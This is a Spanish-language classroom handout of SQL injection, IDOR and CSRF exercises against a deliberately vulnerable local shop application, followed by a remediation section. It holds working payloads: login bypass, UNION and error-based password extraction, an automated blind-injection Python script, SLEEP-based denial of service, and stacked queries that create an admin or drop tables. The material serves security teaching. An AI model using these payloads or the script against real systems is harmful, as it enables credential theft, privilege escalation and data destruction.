# inyection.md — Ejercicios de Inyección SQL (SQL Injection)

> ⚠️ **Uso exclusivamente educativo.** Este documento acompaña a la
> aplicación deliberadamente vulnerable `tienda_vulnerable` (ver
> [README.md](README.md)) y está pensado para una clase de seguridad en
> bases de datos. Todos los ejercicios se ejecutan **únicamente a
> través del navegador o de peticiones HTTP a la aplicación web**,
> **sin abrir nunca un cliente MySQL ni tener acceso directo a la base
> de datos**. El objetivo es demostrar que, si el código de la
> aplicación es vulnerable, un atacante externo puede robar
> información sensible (incluidas contraseñas) usando solo el
> navegador.

## Índice de ejercicios

### SQL Injection clásica
1. [Fingerprinting del motor de base de datos (error-based)](#ejercicio-1-fingerprinting-del-motor-de-base-de-datos)
2. [Bypass de autenticación](#ejercicio-2-bypass-de-autenticación)
3. [Extracción directa de contraseñas con UNION SELECT (módulo Clientes)](#ejercicio-3-extracción-directa-de-contraseñas-con-union-select)
4. [Extracción directa de contraseñas con UNION SELECT (módulo Ventas)](#ejercicio-4-union-select-en-el-módulo-de-ventas)
5. [Extracción ciega (Blind Boolean-based) carácter por carácter](#ejercicio-5-inyección-ciega-blind-boolean-based)
6. [Extracción ciega basada en tiempo (Blind Time-based)](#ejercicio-6-inyección-ciega-basada-en-tiempo-time-based)
7. [Automatización: script Python que roba la contraseña solo](#ejercicio-7-automatización-con-script-python)

### Reconocimiento y abuso del motor de base de datos
8. [Enumeración del esquema con `information_schema`](#ejercicio-8-enumeración-del-esquema-con-information_schema)
9. [Fuga de privilegios de la cuenta de conexión (`root`)](#ejercicio-9-fuga-de-privilegios-de-la-cuenta-de-conexión)
10. [Extracción rápida con Error-based (`EXTRACTVALUE`)](#ejercicio-10-extracción-rápida-con-error-based-extractvalue)
11. [Denegación de servicio (DoS) con consultas pesadas](#ejercicio-11-denegación-de-servicio-dos-con-consultas-pesadas)

### Vulnerabilidades avanzadas / relacionadas con la base de datos
12. [Stacked Queries: creación de un administrador falso](#ejercicio-12-stacked-queries-creación-de-un-administrador-falso)
13. [SQL Injection de segundo orden](#ejercicio-13-sql-injection-de-segundo-orden)
14. [IDOR: acceso a perfiles ajenos](#ejercicio-14-idor-insecure-direct-object-reference)
15. [CSRF + Mass Assignment: escalación de privilegios](#ejercicio-15-csrf--mass-assignment-escalación-de-privilegios)

16. [Remediación: cómo se corrige cada vulnerabilidad](#remediación)

Requisitos previos: la aplicación corriendo (`./run.sh`) y haber
iniciado sesión al menos una vez con un usuario legítimo (por ejemplo
`cajero1` / `Cajero2024`) para los ejercicios que requieren sesión
(todos excepto el login).

---

## Ejercicio 1: Fingerprinting del motor de base de datos

**Objetivo:** Sin credenciales ni acceso a la base de datos, averiguar
qué motor de base de datos usa el sitio y obtener información de
depuración que no debería mostrarse nunca a un usuario final.

**Dónde:** Formulario de login (`/login`) o filtro de productos
(`/productos?id=`).

**Payload 1 — en el campo "Usuario" del login:**
```
admin'
```
Deja la contraseña con cualquier valor y pulsa "Ingresar".

**Resultado esperado:** la aplicación muestra un cuadro rojo con:
- Motor detectado: MySQL
- Código de error: `1064`
- Mensaje nativo: `You have an error in your SQL syntax; check the
  manual... near '' at line 1`
- La consulta SQL completa que se ejecutó en el servidor

**Payload 2 — en la URL de productos:**
```
http://127.0.0.1:5000/productos?id=abc
```
**Resultado esperado:** código de error `1054` y mensaje `Unknown
column 'abc' in 'where clause'`.

**Lección:** un atacante usa estos mensajes para identificar el motor
(MySQL vs PostgreSQL vs SQL Server, cada uno con mensajes distintos),
el nombre de columnas, y a veces hasta fragmentos de la consulta
original, todo **sin tener usuario ni contraseña válidos**.

---

## Ejercicio 2: Bypass de autenticación

**Objetivo:** Iniciar sesión como `admin` sin conocer su contraseña.

**Dónde:** Formulario de login (`/login`).

**Payload — campo "Usuario":**
```
' OR 1=1 -- -
```
**Campo "Contraseña":** cualquier valor, por ejemplo `x`.

**Por qué funciona:** la consulta real que arma la aplicación es:
```sql
SELECT * FROM usuarios WHERE nombre_usuario = '' OR 1=1 -- -' AND password = 'x'
```
Todo lo que sigue a `--` se convierte en comentario, y `OR 1=1` hace
que la condición sea verdadera para **todas** las filas de la tabla
`usuarios`. La aplicación toma la primera fila devuelta (normalmente
`admin`) e inicia sesión con ese usuario.

**Variante dirigida a un usuario específico (sin saber su contraseña):**
```
admin' -- -
```
Esto anula por completo la verificación de la contraseña para el
usuario `admin`.

---

## Ejercicio 3: Extracción directa de contraseñas con UNION SELECT

**Objetivo:** Ver en pantalla, en texto plano, los usuarios y
contraseñas del sistema **usando el buscador de clientes**, un módulo
que en apariencia no tiene nada que ver con el login.

**Dónde:** `/clientes?q=`

**Por qué funciona:** la consulta original es:
```sql
SELECT id, nombre, apellido, email, telefono, direccion, ciudad
FROM clientes WHERE nombre LIKE '%<q>%' OR apellido LIKE '%<q>%'
```
Tiene **7 columnas**, el mismo número de columnas que la tabla
`usuarios` (`id, nombre_usuario, password, nombre_completo, rol,
email, fecha_creacion`). Esto permite anexar un `UNION SELECT` que
reutiliza las mismas 7 columnas para traer datos de otra tabla.

**Payload (pegar en el campo de búsqueda de Clientes):**
```
' UNION SELECT id, nombre_usuario, password, nombre_completo, rol, email, fecha_creacion FROM usuarios -- -
```

**Resultado esperado:** la tabla de "clientes" muestra, al final, filas
con el usuario en la columna "Nombre" y la **contraseña en texto
plano** en la columna "Apellido", por ejemplo:

| ID | Nombre    | Apellido       | ...  |
|----|-----------|----------------|------|
| 1  | admin     | Admin#2024!    | ...  |
| 2  | gerente1  | Gerente123     | ...  |
| 3  | cajero1   | Cajero2024     | ...  |

**Cómo descubrir el número de columnas sin saberlo de antemano** (técnica
real de un atacante, por prueba y error):
```
' ORDER BY 1 -- -
' ORDER BY 7 -- -      (funciona, 7 columnas)
' ORDER BY 8 -- -      (produce error: "Unknown column '8' in 'order clause'")
```

---

## Ejercicio 4: UNION SELECT en el módulo de Ventas

**Objetivo:** Repetir la extracción de credenciales desde un módulo
distinto (ventas), demostrando que la vulnerabilidad se repite en
varios puntos de la aplicación.

**Dónde:** `/ventas?cliente=`

**Payload:**
```
' UNION SELECT id, CONCAT(nombre_usuario,':',password), NOW(), 0, rol FROM usuarios -- -
```

**Resultado esperado:** en la columna "Cliente" de la tabla de ventas
aparecen filas como `admin:Admin#2024!`, `gerente1:Gerente123`,
`cajero1:Cajero2024`, etc.

---

## Ejercicio 5: Inyección ciega (Blind Boolean-based)

**Objetivo:** Extraer la contraseña de un usuario **carácter por
carácter**, sin que la aplicación muestre directamente ningún dato de
la tabla `usuarios` (a diferencia de los ejercicios 3 y 4). Esta es la
técnica que se usa cuando no hay un UNION disponible (por ejemplo,
número de columnas distinto o filtro de caracteres), y es la base real
de la mayoría de ataques de SQLi automatizados (sqlmap, etc.).

**Dónde:** `/productos?id=` (recuerda iniciar sesión primero).

**Principio:** la consulta vulnerable es:
```sql
SELECT ... FROM productos p ... WHERE p.id = <valor> ORDER BY p.id
```
Si inyectamos `0 OR <condición>`, cuando `<condición>` es **verdadera**
la aplicación devuelve **todos los productos** (10 filas); cuando es
**falsa**, devuelve una lista **vacía**. Esa diferencia visual (hay
productos / no hay productos) es el "oráculo" booleano que se explota.

**Paso 1 — Confirmar que el usuario `admin` existe:**
```
http://127.0.0.1:5000/productos?id=0 OR (SELECT COUNT(*) FROM usuarios WHERE nombre_usuario='admin')=1
```
→ Se listan productos = el usuario existe.

**Paso 2 — Averiguar la longitud de su contraseña (probar 1, 2, 3...):**
```
http://127.0.0.1:5000/productos?id=0 OR (SELECT LENGTH(password) FROM usuarios WHERE nombre_usuario='admin')=11
```
→ Con `=11` la consulta devuelve productos (verdadero): la contraseña
del `admin` tiene 11 caracteres.

**Paso 3 — Extraer el primer carácter probando su código ASCII:**
```
http://127.0.0.1:5000/productos?id=0 OR (SELECT ASCII(SUBSTRING(password,1,1)) FROM usuarios WHERE nombre_usuario='admin')=65
```
→ Devuelve productos (verdadero): el carácter 1 es `chr(65)` = `A`.

**Paso 4 — Repetir para cada posición (2, 3, 4...) probando distintos
códigos ASCII** (lo ideal es hacer búsqueda binaria entre 32 y 126,
ver el script automatizado del Ejercicio 7) hasta reconstruir la
contraseña completa: `Admin#2024!`.

**Importante:** en ningún momento se usó un cliente MySQL ni se vio el
valor real de la contraseña en el HTML; solo se observó si la página
mostraba "hay productos" o "sin resultados".

---

## Ejercicio 6: Inyección ciega basada en tiempo (Time-based)

**Objetivo:** Extraer información incluso cuando la aplicación **no
muestra ninguna diferencia visual** entre una condición verdadera y
una falsa (por ejemplo, si el desarrollador "arregló" el oráculo
booleano pero sigue concatenando SQL sin parametrizar). En este caso
se mide el **tiempo de respuesta** en lugar del contenido.

**Dónde:** `/productos?id=`

**Payload (condición verdadera → tarda ~2 segundos):**
```
http://127.0.0.1:5000/productos?id=0 OR (SELECT SLEEP(2) FROM usuarios WHERE nombre_usuario='admin' LIMIT 1)=0
```
**Payload (condición falsa → respuesta inmediata):**
```
http://127.0.0.1:5000/productos?id=0 OR (SELECT SLEEP(2) FROM usuarios WHERE nombre_usuario='noexiste' LIMIT 1)=0
```

> Nota técnica: si se omite `LIMIT 1` y se inyecta `SLEEP()` como una
> condición evaluada por cada fila de la tabla (en vez de una
> subconsulta escalar con `LIMIT 1`), MySQL puede ejecutar la función
> una vez **por cada fila escaneada**, multiplicando el retraso (por
> ejemplo, 10 productos × 2 s = 20 s). Usar una subconsulta escalar
> con `LIMIT 1` produce un retraso limpio y predecible, ideal para
> medir con precisión.

**Validación realizada:** se comprobó que con `LIMIT 1` el retraso es
de ~2.1 segundos (condición verdadera) frente a ~0.1-0.2 segundos
(condición falsa o sin inyección), confirmando el oráculo basado en
tiempo.

Con esta misma lógica, sustituyendo la condición por
`ASCII(SUBSTRING(password,N,1)) > X`, se puede reconstruir la
contraseña completa midiendo únicamente **cuánto tarda en responder el
servidor**, sin ver ningún dato en pantalla.

---

## Ejercicio 7: Automatización con script Python

El siguiente script en Python (usando solo la librería `requests`, es
decir, **solo peticiones HTTP como lo haría un navegador**) automatiza
el Ejercicio 5 con búsqueda binaria para extraer la contraseña
completa en segundos, sin tocar la base de datos directamente. Fue
probado contra esta aplicación y extrae correctamente `Admin#2024!`.

```python
import requests

BASE = "http://127.0.0.1:5000"
s = requests.Session()

# Login legítimo con un usuario de bajo privilegio (no hace falta ser admin)
s.post(f"{BASE}/login", data={"usuario": "cajero1", "clave": "Cajero2024"})


def es_verdadero(condicion):
    """Devuelve True si la condición SQL inyectada es verdadera,
    observando si la página de productos devuelve resultados o no."""
    payload = f"0 OR {condicion}"
    r = s.get(f"{BASE}/productos", params={"id": payload})
    return r.text.count("<tr>") > 3  # cabecera + alguna fila de datos


usuario_objetivo = "admin"

# 1) Longitud de la contraseña
longitud = 0
for posible in range(1, 30):
    cond = (
        f"(SELECT LENGTH(password) FROM usuarios "
        f"WHERE nombre_usuario='{usuario_objetivo}')={posible}"
    )
    if es_verdadero(cond):
        longitud = posible
        break
print(f"Longitud detectada: {longitud}")

# 2) Cada carácter, por búsqueda binaria sobre su código ASCII (32-126)
password = ""
for pos in range(1, longitud + 1):
    bajo, alto = 32, 126
    while bajo < alto:
        medio = (bajo + alto) // 2
        cond = (
            f"(SELECT ASCII(SUBSTRING(password,{pos},1)) FROM usuarios "
            f"WHERE nombre_usuario='{usuario_objetivo}')>{medio}"
        )
        if es_verdadero(cond):
            bajo = medio + 1
        else:
            alto = medio
    password += chr(bajo)
    print(f"Progreso: {password}")

print(f"\nContraseña extraída de '{usuario_objetivo}': {password}")
```

**Salida real obtenida al ejecutarlo contra esta aplicación:**
```
Longitud detectada: 11
Progreso: A
Progreso: Ad
Progreso: Adm
Progreso: Admi
Progreso: Admin
Progreso: Admin#
Progreso: Admin#2
Progreso: Admin#20
Progreso: Admin#202
Progreso: Admin#2024
Progreso: Admin#2024!

Contraseña extraída de 'admin': Admin#2024!
```

**Punto clave para la clase:** esto es, en esencia, lo que hacen
herramientas automatizadas como **sqlmap**. El "atacante" nunca
necesitó un usuario administrador, nunca abrió un cliente MySQL y
nunca vio directamente la base de datos: solo envió peticiones HTTP al
sitio web y dedujo la contraseña observando las respuestas.

---

## Ejercicio 8: Enumeración del esquema con `information_schema`

**Objetivo:** Descubrir qué tablas y columnas existen en la base de
datos **sin que nadie te las haya dicho antes**, como haría un
atacante real que no conoce el modelo de datos de la tienda.

**Dónde:** `/clientes?q=` (mismo punto de inyección UNION del
Ejercicio 3).

**Paso 1 — Descubrir el número de columnas (si no lo supieras ya):**
```
' ORDER BY 7 -- -      (funciona)
' ORDER BY 8 -- -      (error: "Unknown column '8' in 'order clause'")
```
Confirma que la consulta original tiene 7 columnas.

**Paso 2 — Listar las tablas de la base de datos actual:**
```
' UNION SELECT 1, table_name, 3, 4, 5, 6, 7 FROM information_schema.tables WHERE table_schema='tienda_vulnerable' -- -
```
**Resultado esperado (validado):** aparecen listadas `categorias`,
`clientes`, `detalle_ventas`, `productos`, `usuarios`, `ventas`.

**Paso 3 — Listar las columnas de la tabla `usuarios` una vez que ya
se conoce su nombre:**
```
' UNION SELECT 1, column_name, 3, 4, 5, 6, 7 FROM information_schema.columns WHERE table_name='usuarios' -- -
```
Esto revela los nombres exactos de las columnas (`nombre_usuario`,
`password`, `rol`, etc.) que luego se usan en los ejercicios de UNION
SELECT.

**Lección:** antes de robar datos, un atacante primero **mapea** la
base de datos completa usando únicamente `information_schema`, una
vista estándar presente en todo servidor MySQL a la que cualquier
usuario con permiso de lectura puede acceder.

---

## Ejercicio 9: Fuga de privilegios de la cuenta de conexión

**Objetivo:** Determinar con qué usuario de MySQL se conecta la
aplicación y qué tan peligroso es ese nivel de acceso. En esta demo la
aplicación se conecta como `root`, una violación grave del principio
de mínimo privilegio que conviene exponer con datos concretos.

**Dónde:** `/clientes?q=`

**Payload:**
```
' UNION SELECT 1, user(), @@version, @@datadir, @@hostname, 6, 7 -- -
```

**Resultado real obtenido al probarlo:**

| Campo             | Valor obtenido       |
|--------------------|----------------------|
| `user()`           | `root@localhost`     |
| `@@version`        | `8.0.46`             |
| `@@datadir`        | `/var/lib/mysql/`    |
| `@@hostname`       | `mac-evazquez`       |

**Por qué importa:** si la cuenta de la aplicación fuera un usuario
con privilegios acotados (`SELECT` solo sobre las tablas necesarias),
el daño de una SQLi se limitaría a esas tablas. Al ser `root`, un
atacante con SQLi puede, en teoría, leer y escribir cualquier base de
datos del servidor, crear usuarios de MySQL, o (si `secure_file_priv`
lo permite) leer/escribir archivos del sistema operativo con
`LOAD_FILE()` / `INTO OUTFILE`. En esta instalación de prueba,
`secure_file_priv` está restringido a un directorio específico
(`/var/lib/mysql-files/`), lo cual limita ese vector concreto, pero no
cambia el hecho de que la cuenta sigue siendo `root` con permisos
totales sobre todas las bases de datos del servidor (`GRANT ALL ...
WITH GRANT OPTION`).

---

## Ejercicio 10: Extracción rápida con Error-based (`EXTRACTVALUE`)

**Objetivo:** Obtener datos sensibles en un solo request, sin
necesidad de UNION SELECT ni de preguntas ciegas carácter por
carácter, aprovechando que MySQL incluye el resultado de una
subconsulta directamente en el mensaje de error.

**Dónde:** `/productos?id=`

**Payload:**
```
http://127.0.0.1:5000/productos?id=0 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM usuarios WHERE nombre_usuario='admin')))
```

**Resultado real obtenido al probarlo:**
```
Mensaje del servidor: XPATH syntax error: '~Admin#2024!'
```
La contraseña `Admin#2024!` aparece directamente en el mensaje de
error (el carácter `~`, código hexadecimal `0x7e`, se usa solo como
separador visual).

**Por qué es más peligroso que la inyección ciega:** en el Ejercicio
5 se necesitaban decenas de peticiones (una por cada bit de
información) para reconstruir una sola contraseña. Aquí basta **una
sola petición** para obtener el dato completo, siempre que la
aplicación muestre el mensaje de error nativo del motor (como hace
esta app).

---

## Ejercicio 11: Denegación de servicio (DoS) con consultas pesadas

**Objetivo:** Mostrar que la inyección SQL no solo sirve para robar
datos: también puede usarse para **tumbar el rendimiento del
servicio** sin robar absolutamente nada, simplemente forzando al
motor a hacer trabajo innecesario.

**Dónde:** `/productos?id=`

**Payload (SLEEP sin optimizar, se repite por cada fila evaluada):**
```
http://127.0.0.1:5000/productos?id=0 OR SLEEP(3)
```

**Resultado real obtenido al probarlo:** la petición tardó **30
segundos** en responder (en vez de los 3 segundos que un desarrollador
inexperto esperaría). Esto ocurre porque la condición `SLEEP(3)` se
evalúa **una vez por cada una de las 10 filas** que escanea la
consulta (`10 × 3s = 30s`), multiplicando el impacto.

**Payload alternativo (consulta cartesiana, consume CPU sin dormir):**
```
http://127.0.0.1:5000/productos?id=0 OR (SELECT COUNT(*) FROM information_schema.columns a, information_schema.columns b, information_schema.columns c) > 0
```

**Lección para la clase:** si un atacante automatiza este tipo de
peticiones (por ejemplo, decenas de peticiones concurrentes con
`SLEEP(30)` cada una), puede agotar el número máximo de conexiones
simultáneas que acepta MySQL o saturar los hilos de trabajo del
servidor web, provocando una caída del servicio para usuarios
legítimos, sin necesidad de explotar ninguna otra vulnerabilidad.

---

## Ejercicio 12: Stacked Queries (creación de un administrador falso)

**Objetivo:** Ejecutar sentencias SQL completamente distintas a la
consulta original (`INSERT`, `UPDATE`, incluso `DROP TABLE`)
"apilándolas" después de un punto y coma, y usar eso para crear una
cuenta de administrador desde cero.

**Dónde:** `/reportes?producto=` — este módulo, a diferencia de los
demás, abre la conexión con `CLIENT_MULTI_STATEMENTS` habilitado (ver
`get_connection_multi_statement()` en `app.py`), lo que permite
ejecutar varias sentencias separadas por `;` en una sola consulta,
igual que ocurre con `mysqli_multi_query()` en PHP o con varios
drivers nativos que no deshabilitan esta característica por defecto.

**Payload (campo "producto" del formulario de Reportes):**
```
x'; INSERT INTO usuarios (nombre_usuario,password,nombre_completo,rol) VALUES ('hacker','1234','Intruso','administrador'); -- -
```

**Resultado real obtenido al probarlo:**
- La página de reportes confirmó: `Sentencias SQL ejecutadas en esta
  petición: 3` (el `SELECT` original + el `INSERT` inyectado + la
  sentencia vacía que queda tras el comentario `-- -`).
- Acto seguido, fue posible iniciar sesión en `/login` con usuario
  `hacker` y contraseña `1234`, obteniendo automáticamente el rol
  `administrador`.

**Otras variantes destructivas que se podrían inyectar de la misma
forma (NO ejecutar contra datos reales sin autorización):**
```
x'; UPDATE usuarios SET rol='administrador' WHERE nombre_usuario='cajero1'; -- -
x'; DROP TABLE ventas; -- -
```

**Por qué el resto de la aplicación NO es vulnerable a esto:** todas
las demás rutas usan `get_connection()` (sin
`CLIENT_MULTI_STATEMENTS`), por lo que PyMySQL rechaza cualquier
intento de incluir una segunda sentencia con `;`. Esta restricción
existe específicamente en `/reportes` para poder enseñar la técnica de
forma aislada y controlada.

---

## Ejercicio 13: SQL Injection de segundo orden

**Objetivo:** Entender que **parametrizar una consulta no es
suficiente si, más adelante, el dato ya guardado se reutiliza sin
parametrizar en otra consulta diferente**. Esta es la esencia de la
inyección de segundo orden: el payload no se dispara al guardarlo,
sino después, cuando se vuelve a leer.

**Dónde:**
1. `/clientes/nuevo` — formulario para registrar un cliente nuevo
   (usa `INSERT` **parametrizado**, por lo que el alta en sí **no** es
   vulnerable a inyección directa).
2. `/clientes/<id>/resumen` — página de "resumen de compras" de ese
   cliente, que sí concatena el nombre guardado sin parametrizar.

**Paso 1 — Registrar un cliente malicioso.** En el formulario
`/clientes/nuevo`, en el campo **Nombre**, escribe:
```
x' UNION SELECT id, CONCAT(nombre_usuario,':',password), NOW(), 'efectivo' FROM usuarios -- -
```
Completa el resto de campos con cualquier valor y guarda. La
aplicación te redirige automáticamente al resumen de ese cliente.

**Resultado real obtenido al probarlo:** la tabla de "Resumen de
compras" mostró filas como:

| ID Venta | Total                        | Fecha               | Método de pago |
|----------|------------------------------|----------------------|-----------------|
| 1        | L. admin:Admin#2024!         | 2026-10-22 12:15:40  | efectivo        |
| 3        | L. cajero1:Cajero2024        | 2026-10-22 12:15:40  | efectivo        |
| 6        | L. hacker:1234               | 2026-10-22 12:15:40  | efectivo        |

Es decir, el campo "Total" de la venta en realidad muestra
`usuario:contraseña` de la tabla `usuarios`, filtrados a través de un
módulo que, en apariencia, solo consulta compras de clientes.

**Por qué es distinto a los ejercicios anteriores:** en el Ejercicio
3/4 el payload viaja directamente en el parámetro de la URL/formulario
y se ejecuta en el acto. Aquí el payload **ya pasó por un INSERT
seguro** y quedó almacenado tranquilamente en la tabla `clientes`;
la vulnerabilidad se dispara **cada vez que alguien** (un empleado,
un reporte automático, un proceso por lotes) visita el resumen de
ESE cliente en particular, incluso días después de haberlo creado.

---

## Ejercicio 14: IDOR (Insecure Direct Object Reference)

**Objetivo:** Ver los datos de **otro usuario** (incluida su
contraseña en texto plano) simplemente cambiando un número en la
URL, sin que la aplicación verifique que ese recurso te pertenece.

**Dónde:** `/perfil?usuario_id=`

**Paso 1 — Iniciar sesión como un usuario de bajo privilegio:**
```
usuario: cajero1
clave:   Cajero2024
```

**Paso 2 — Visitar el perfil de OTRO usuario cambiando el id:**
```
http://127.0.0.1:5000/perfil?usuario_id=1
```

**Resultado real obtenido al probarlo:** aunque la sesión activa es la
de `cajero1`, la página mostró el perfil completo del usuario `admin`
(id `1`), incluyendo su contraseña en texto plano `Admin#2024!`, su
rol `administrador` y su correo, sin ninguna validación de que
`cajero1` tuviera derecho a consultar ese registro.

**Bonus — este mismo parámetro también es inyectable por SQL**, porque
se concatena sin parametrizar:
```
http://127.0.0.1:5000/perfil?usuario_id=0 OR 1=1
```
(esto devuelve el primer usuario de la tabla, demostrando que el IDOR
y la SQLi conviven en el mismo punto de entrada).

**Lección:** un IDOR ocurre cuando la aplicación usa un identificador
que el propio cliente puede manipular (`usuario_id` en la URL) sin
comprobar en el servidor que ese identificador pertenece al usuario
autenticado. La corrección no tiene nada que ver con SQL: es un
problema de **autorización**, no de sanitización de entradas.

---

## Ejercicio 15: CSRF + Mass Assignment (escalación de privilegios)

**Objetivo:** Lograr que un usuario con rol `empleado` (`cajero1`)
termine con rol `administrador`, combinando dos fallas distintas:

- **Mass Assignment:** el formulario "Actualizar mi perfil" acepta y
  guarda **cualquier campo** que llegue del cliente, incluido `rol`,
  un campo que el usuario nunca debería poder modificar sobre sí
  mismo.
- **CSRF (Cross-Site Request Forgery):** la ruta que procesa esa
  actualización no exige ningún token de verificación, y además
  acepta el método `GET`, lo que facilita disparar el ataque con solo
  abrir un enlace o visitar una página externa.

**Parte A — Explotación manual (sin ingeniería social):**

Con la sesión de `cajero1` activa, visita directamente esta URL en el
navegador (o en una pestaña nueva):
```
http://127.0.0.1:5000/perfil/actualizar?rol=administrador&nombre_completo=Cuenta+modificada&email=hack@evil.com
```
**Resultado real obtenido al probarlo:** tras visitar esa URL, el
perfil de `cajero1` pasó a mostrar `Rol: administrador` de inmediato,
sin ninguna confirmación ni verificación adicional.

**Parte B — Explotación vía CSRF (ingeniería social):**

En el proyecto se incluye un archivo de prueba de concepto:
[csrf_poc/csrf_poc.html](csrf_poc/csrf_poc.html). Simula una página
externa ("¡Felicidades, ganaste un premio!") que, al abrirse en el
mismo navegador donde la víctima tiene sesión iniciada, envía
automáticamente (sin que la víctima haga nada) la misma petición de
escalación de privilegios.

**Cómo probarlo en clase:**
1. Inicia sesión como `cajero1` en una pestaña del navegador.
2. Sin cerrar esa sesión, abre el archivo
   `csrf_poc/csrf_poc.html` directamente desde el explorador de
   archivos (doble clic) en el mismo navegador.
3. El formulario oculto se autoenvía en 1 segundo hacia
   `http://127.0.0.1:5000/perfil/actualizar`.
4. Vuelve a la pestaña de la aplicación y recarga `/perfil`: el rol de
   `cajero1` ahora es `administrador`, sin que el usuario haya
   escrito nada ni haya dado clic en ningún botón dentro del sitio.

**Nota técnica importante (abordar en clase):** el PoC usa
`method="GET"` intencionalmente. Los navegadores modernos tratan por
defecto las cookies sin el atributo `SameSite` explícito como
`SameSite=Lax`, lo que permite que una navegación de nivel superior
con `GET` (como un formulario que se autoenvía) sí incluya las cookies
de sesión, pero bloquearía un `POST` disparado desde un origen
distinto. Esto demuestra una tercera falla: **usar `GET` para una
acción que modifica datos es, en sí mismo, un antipatrón de
seguridad**, independientemente de la falta de token CSRF.

---

## Remediación

Para las técnicas de **inyección SQL** (Ejercicios 1 al 13), la causa
raíz es la misma: **las consultas SQL se arman concatenando entrada
del usuario** (o datos que vinieron originalmente del usuario y se
reutilizan sin parametrizar). La corrección también es la misma en
todos los casos:

1. **Usar consultas parametrizadas (prepared statements)** en vez de
   concatenar cadenas, tanto al escribir datos como al leerlos y
   reutilizarlos en consultas posteriores (clave para corregir también
   el Ejercicio 13, de segundo orden). Con PyMySQL:
   ```python
   cursor.execute(
       "SELECT * FROM usuarios WHERE nombre_usuario = %s AND password = %s",
       (usuario, clave),
   )
   ```
   El driver se encarga de escapar los valores; `' OR 1=1 -- -` deja
   de tener efecto porque se trata como un dato literal, nunca como
   código SQL.

2. **Validar y convertir tipos de datos** antes de usarlos en una
   consulta (por ejemplo, si `id` debe ser numérico, convertirlo con
   `int()` y rechazar la petición si falla la conversión).

3. **No mostrar mensajes de error nativos del motor de base de datos**
   al usuario final; registrar el detalle en un log interno y mostrar
   un mensaje genérico ("Ocurrió un error, intenta más tarde"). Esto
   corrige a la vez el fingerprinting (Ejercicio 1) y la extracción
   error-based con `EXTRACTVALUE` (Ejercicio 10).

4. **Aplicar el principio de mínimo privilegio**: la cuenta de MySQL
   que usa la aplicación no debería poder leer tablas que no necesita,
   y mucho menos conectarse como `root` (Ejercicio 9). Lo correcto es
   crear un usuario de MySQL dedicado con permisos acotados, por
   ejemplo:
   ```sql
   CREATE USER 'app_tienda'@'%' IDENTIFIED BY 'una-clave-fuerte';
   GRANT SELECT, INSERT, UPDATE ON tienda_vulnerable.* TO 'app_tienda'@'%';
   -- Sin DROP, sin FILE, sin privilegios sobre information_schema más
   -- allá de lo que MySQL exige por defecto, y sin acceso a otras BD.
   ```

5. **Nunca almacenar contraseñas en texto plano**: usar un algoritmo de
   hash con sal, como `bcrypt`, `scrypt` o `argon2`. Así, incluso si un
   atacante logra extraer la columna `password` mediante SQLi, no
   obtiene la contraseña real utilizable directamente.

6. **Desactivar `debug=True`** y cualquier panel de depuración (como el
   debugger de Werkzeug) en producción.

7. **Deshabilitar `CLIENT_MULTI_STATEMENTS`** (Ejercicio 12): ningún
   endpoint de la aplicación debería abrir una conexión que permita
   ejecutar varias sentencias separadas por `;` en una sola llamada;
   si de verdad se necesitan varias sentencias, deben ejecutarse como
   llamadas independientes a `cursor.execute()`, cada una
   parametrizada por separado.

8. **Establecer límites de tiempo de ejecución** (`MAX_EXECUTION_TIME`
   en MySQL, o timeouts a nivel de conexión) para mitigar el impacto de
   un ataque de denegación de servicio como el del Ejercicio 11.

Para las vulnerabilidades que **no son de inyección SQL** (Ejercicios
14 y 15), la corrección es distinta porque el problema no está en el
texto de la consulta, sino en la **lógica de autorización** de la
aplicación:

9. **Corregir el IDOR (Ejercicio 14)**: nunca confiar en un
   identificador que llega del cliente (parámetro de URL, campo
   oculto, etc.) para decidir qué registro mostrar. La ruta `/perfil`
   debería ignorar por completo cualquier `usuario_id` externo para
   el caso de "mi perfil", y si se necesita un endpoint de
   administración para ver perfiles ajenos, debe verificar
   explícitamente en el servidor que `session["rol"] ==
   "administrador"` antes de permitir la consulta:
   ```python
   @app.route("/perfil")
   @login_requerido
   def perfil():
       # Nunca leer el id objetivo del request si no se valida el rol.
       usuario_id = session["usuario_id"]
       if request.args.get("usuario_id") and session.get("rol") == "administrador":
           usuario_id = int(request.args["usuario_id"])  # y aún así, parametrizado
       cursor.execute("SELECT id, nombre_usuario, nombre_completo, rol, email "
                       "FROM usuarios WHERE id = %s", (usuario_id,))
   ```
   Nótese además que la columna `password` nunca debería incluirse en
   el `SELECT` de un perfil, ni siquiera para el propio usuario.

10. **Corregir el Mass Assignment (Ejercicio 15)**: nunca actualizar
    una fila con "todos los campos que llegaron del formulario".
    Siempre se debe construir explícitamente una lista blanca (allow
    list) de los campos que el usuario tiene permitido modificar sobre
    sí mismo, excluyendo campos sensibles como `rol`:
    ```python
    # Correcto: el campo "rol" NUNCA se lee del formulario del propio
    # usuario; solo un endpoint de administración, protegido por rol,
    # podría cambiarlo, y únicamente sobre otros usuarios.
    cursor.execute(
        "UPDATE usuarios SET nombre_completo = %s, email = %s WHERE id = %s",
        (nombre_completo, email, session["usuario_id"]),
    )
    ```

11. **Corregir el CSRF (Ejercicio 15)**:
    - Usar `Flask-WTF` (o similar) para generar y validar un **token
      anti-CSRF** único por sesión/formulario en cada petición que
      modifique datos.
    - Restringir las acciones que cambian estado a los métodos HTTP
      apropiados (`POST`/`PUT`/`DELETE`), nunca `GET`, ya que los
      navegadores tratan las peticiones `GET` como "seguras" y las
      incluyen con más facilidad en navegaciones automáticas de otro
      sitio.
    - Configurar explícitamente la cookie de sesión con
      `SESSION_COOKIE_SAMESITE="Strict"` (o al menos `"Lax"`, que ya
      es el comportamiento por defecto moderno) y `SESSION_COOKIE_SECURE
      = True` quien sirva la aplicación sobre HTTPS.
